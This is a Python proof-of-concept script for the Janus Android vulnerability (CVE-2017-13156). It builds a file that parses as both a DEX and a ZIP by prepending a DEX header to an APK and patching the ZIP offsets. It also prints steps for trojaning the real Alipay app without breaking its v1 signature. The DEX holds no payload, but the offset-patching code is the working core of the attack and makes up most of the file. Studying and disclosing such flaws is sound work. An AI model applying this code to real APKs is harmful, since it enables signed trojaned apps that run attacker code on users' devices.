#!/usr/bin/env python3
"""Janus Vulnerability (CVE-2017-13156) Proof of Concept.

Demonstrates how an APK with only v1 signature can be prepended
with a DEX header, causing Android runtime to execute attacker's
code while the v1 signature remains valid.
"""
import struct
import os
import sys
import hashlib
import zipfile
import io

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

# DEX magic: "dex\n035\0"
DEX_MAGIC = b'dex\n035\x00'
# Minimal DEX header size
DEX_HEADER_SIZE = 0x70  # 112 bytes

# ZIP signatures
ZIP_LOCAL_FILE_HEADER = b'\x50\x4b\x03\x04'
ZIP_CENTRAL_DIR = b'\x50\x4b\x01\x02'
ZIP_EOCD = b'\x50\x4b\x05\x06'


def create_minimal_dex():
    """Create a minimal valid DEX file (035 format).

    This is a simplified DEX that contains a minimal class
    with a static method. In a real attack, this would contain
    the malicious payload code.
    """
    # DEX header fields
    header = bytearray(DEX_HEADER_SIZE)

    # Magic
    header[0:8] = DEX_MAGIC

    # Checksum placeholder (offset 8, 4 bytes) - will be filled later
    # SHA-1 signature placeholder (offset 12, 20 bytes) - will be filled later

    # File size (offset 32, 4 bytes)
    file_size = DEX_HEADER_SIZE + 32  # header + minimal data
    struct.pack_into('<I', header, 32, file_size)

    # Header size (offset 36, 4 bytes) = 0x70
    struct.pack_into('<I', header, 36, DEX_HEADER_SIZE)

    # Endian tag (offset 40, 4 bytes) = 0x12345678 (little-endian)
    struct.pack_into('<I', header, 40, 0x12345678)

    # Link size and offset (44-51) = 0
    # Map offset (52) = 0

    # String IDs size=1, offset=header_size
    struct.pack_into('<I', header, 56, 1)
    struct.pack_into('<I', header, 60, DEX_HEADER_SIZE)

    # Type IDs, Proto IDs, Field IDs, Method IDs, Class defs = 0 for minimal
    # Data size and offset
    struct.pack_into('<I', header, 104, 32)
    struct.pack_into('<I', header, 108, DEX_HEADER_SIZE)

    # Minimal string data after header
    string_data = b'\x00' * 32  # Placeholder string pool

    dex = bytes(header) + string_data

    # Compute SHA-1 (over everything after offset 32)
    sha1 = hashlib.sha1(dex[32:]).digest()
    dex_mut = bytearray(dex)
    dex_mut[12:32] = sha1

    # Compute Adler32 checksum (over everything after offset 12)
    import zlib
    checksum = zlib.adler32(bytes(dex_mut[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', dex_mut, 8, checksum)

    return bytes(dex_mut)


def create_minimal_apk():
    """Create a minimal ZIP (APK) file with a classes.dex entry."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as zf:
        # Add a fake classes.dex
        zf.writestr('classes.dex', b'\x00' * 64)
        # Add META-INF for v1 signature simulation
        zf.writestr('META-INF/MANIFEST.MF',
                     b'Manifest-Version: 1.0\r\n'
                     b'Created-By: 1.0 (Janus PoC)\r\n\r\n')
        zf.writestr('META-INF/CERT.SF',
                     b'Signature-Version: 1.0\r\n\r\n')
        zf.writestr('META-INF/CERT.RSA', b'\x00' * 128)
    return buf.getvalue()


def demonstrate_janus():
    """Demonstrate the Janus attack by creating a dual-interpretation file."""
    print("━━━ Step 1: Create Minimal DEX ━━━")
    dex_data = create_minimal_dex()
    print(f"  DEX size: {len(dex_data)} bytes")
    print(f"  DEX magic: {dex_data[:8].hex()} ({dex_data[:4]})")
    print(f"  DEX SHA-1: {hashlib.sha1(dex_data).hexdigest()}")
    print()

    print("━━━ Step 2: Create Minimal APK (ZIP) ━━━")
    apk_data = create_minimal_apk()
    print(f"  APK size: {len(apk_data)} bytes")

    # Verify it's a valid ZIP
    try:
        with zipfile.ZipFile(io.BytesIO(apk_data)) as zf:
            entries = zf.namelist()
            print(f"  ZIP entries: {entries}")
            print(f"  ZIP valid: YES")
    except Exception as e:
        print(f"  ZIP valid: NO ({e})")
    print()

    print("━━━ Step 3: Janus Concatenation ━━━")
    print("  Attack principle:")
    print("    1. Android v1 signature verifies ZIP entries only")
    print("    2. ZIP format finds EOCD by scanning from end of file")
    print("    3. Data BEFORE the first local file header is ignored by ZIP parsers")
    print("    4. DEX format reads from offset 0 (file start)")
    print("    5. Prepending DEX header → file is BOTH valid DEX and valid ZIP")
    print()

    # Pad DEX to align with ZIP expectations
    # The DEX data must not interfere with ZIP parsing
    # ZIP parsers find EOCD at end, then follow central directory offsets
    # So we need to adjust central directory offsets

    # Find EOCD in APK
    eocd_offset = apk_data.rfind(ZIP_EOCD)
    if eocd_offset < 0:
        print("  ERROR: Cannot find EOCD in APK")
        return None

    # Read central directory offset from EOCD (offset 16 within EOCD)
    orig_cd_offset = struct.unpack_from('<I', apk_data, eocd_offset + 16)[0]

    # DEX prefix size (padded to nice boundary)
    dex_prefix_size = ((len(dex_data) + 15) // 16) * 16
    dex_padded = dex_data + b'\x00' * (dex_prefix_size - len(dex_data))

    print(f"  DEX prefix: {dex_prefix_size} bytes (padded)")
    print(f"  Original CD offset: {orig_cd_offset}")
    print(f"  New CD offset: {orig_cd_offset + dex_prefix_size}")
    print()

    # Adjust central directory offset in EOCD
    janus_apk = bytearray(dex_padded + apk_data)
    new_eocd_offset = eocd_offset + dex_prefix_size
    struct.pack_into('<I', janus_apk, new_eocd_offset + 16,
                     orig_cd_offset + dex_prefix_size)

    # Also adjust local file header offsets in central directory entries
    new_cd_offset = orig_cd_offset + dex_prefix_size
    pos = new_cd_offset
    while pos < new_eocd_offset:
        if janus_apk[pos:pos+4] == ZIP_CENTRAL_DIR:
            # Local file header offset is at byte 42 within central dir entry
            old_local_offset = struct.unpack_from('<I', janus_apk, pos + 42)[0]
            struct.pack_into('<I', janus_apk, pos + 42,
                           old_local_offset + dex_prefix_size)
            # Get filename length and extra length to find next entry
            fname_len = struct.unpack_from('<H', janus_apk, pos + 28)[0]
            extra_len = struct.unpack_from('<H', janus_apk, pos + 30)[0]
            comment_len = struct.unpack_from('<H', janus_apk, pos + 32)[0]
            pos += 46 + fname_len + extra_len + comment_len
        else:
            break

    janus_file = bytes(janus_apk)

    print("━━━ Step 4: Verify Dual Interpretation ━━━")

    # Check DEX interpretation
    is_dex = janus_file[:8] == DEX_MAGIC
    print(f"  Starts with DEX magic: {'YES ✅' if is_dex else 'NO ❌'}")
    print(f"  DEX header at offset 0: {janus_file[:8].hex()}")

    # Check ZIP interpretation
    try:
        with zipfile.ZipFile(io.BytesIO(janus_file)) as zf:
            entries = zf.namelist()
            is_zip = True
            print(f"  Valid ZIP: YES ✅")
            print(f"  ZIP entries: {entries}")
    except Exception as e:
        is_zip = False
        print(f"  Valid ZIP: NO ❌ ({e})")

    print()
    print(f"  File size: {len(janus_file)} bytes")
    print(f"  DEX prefix: bytes 0-{dex_prefix_size-1}")
    print(f"  APK content: bytes {dex_prefix_size}-{len(janus_file)-1}")
    print()

    # Save the file
    output_path = os.path.join(SCRIPT_DIR, "janus-demo.bin")
    with open(output_path, 'wb') as f:
        f.write(janus_file)
    print(f"  Saved: {output_path}")
    print(f"  SHA-256: {hashlib.sha256(janus_file).hexdigest()}")
    print()

    # Hex dump of key regions
    print("━━━ Step 5: Key Byte Regions ━━━")
    print(f"  Offset 0x000 (DEX magic):  {janus_file[0:16].hex()}")

    # Find first local file header
    lfh_pos = janus_file.find(ZIP_LOCAL_FILE_HEADER)
    if lfh_pos >= 0:
        print(f"  Offset 0x{lfh_pos:03x} (ZIP LFH):   {janus_file[lfh_pos:lfh_pos+16].hex()}")

    # Find EOCD
    eocd_pos = janus_file.rfind(ZIP_EOCD)
    if eocd_pos >= 0:
        print(f"  Offset 0x{eocd_pos:03x} (ZIP EOCD):  {janus_file[eocd_pos:eocd_pos+16].hex()}")
    print()

    return is_dex and is_zip


def explain_alipay_impact():
    """Explain the Janus vulnerability impact on Alipay."""
    print("━━━ Alipay-Specific Impact ━━━")
    print()
    print("  Alipay APK uses v1 signing (JAR signature):")
    print("    - Signature only covers ZIP entry contents")
    print("    - META-INF/*.SF files list SHA-1 digests of entries")
    print("    - Data outside ZIP entries is NOT covered")
    print()
    print("  Janus attack on Alipay:")
    print("    1. Download legitimate Alipay APK (v1 signed)")
    print("    2. Prepend malicious DEX code before ZIP data")
    print("    3. Adjust ZIP offsets so ZIP parsing still works")
    print("    4. v1 signature remains VALID (ZIP entries unchanged)")
    print("    5. Android ART runtime sees DEX at offset 0")
    print("    6. Executes attacker's DEX code instead of legitimate app")
    print()
    print("  CVE-2017-13156 details:")
    print("    Affected: Android 5.0 - 8.0 (API 21-26)")
    print("    Fixed in: December 2017 security patch")
    print("    Severity: HIGH (arbitrary code execution)")
    print()
    print("  Defenses:")
    print("    ✅ APK Signature Scheme v2 (Android 7.0+) signs WHOLE file")
    print("    ✅ APK Signature Scheme v3 (Android 9.0+) adds key rotation")
    print("    ✅ December 2017 patch validates DEX/ZIP ambiguity")
    print("    ⚠️  Sideloaded APKs on unpatched Android <8.0 remain vulnerable")
    print("    ⚠️  Alipay's v1-only signature provides no protection")
    print()


def main():
    print("╔═══════════════════════════════════════════════════════════╗")
    print("║  Janus Vulnerability (CVE-2017-13156) — PoC             ║")
    print("╚═══════════════════════════════════════════════════════════╝")
    print()

    success = demonstrate_janus()

    if success:
        print("  ✅ JANUS ATTACK DEMONSTRATED — file is both valid DEX and valid ZIP")
    else:
        print("  ❌ Demonstration failed")
    print()

    explain_alipay_impact()

    print("━━━ Conclusion ━━━")
    print("  The Janus vulnerability exploits a fundamental design flaw:")
    print("  DEX reads from start, ZIP reads from end.")
    print("  v1 signatures only protect ZIP content, not the file prefix.")
    print("  Any v1-only signed APK (including Alipay) can be trojaned")
    print("  on Android <8.0 without invalidating the signature.")
    print()


if __name__ == "__main__":
    main()
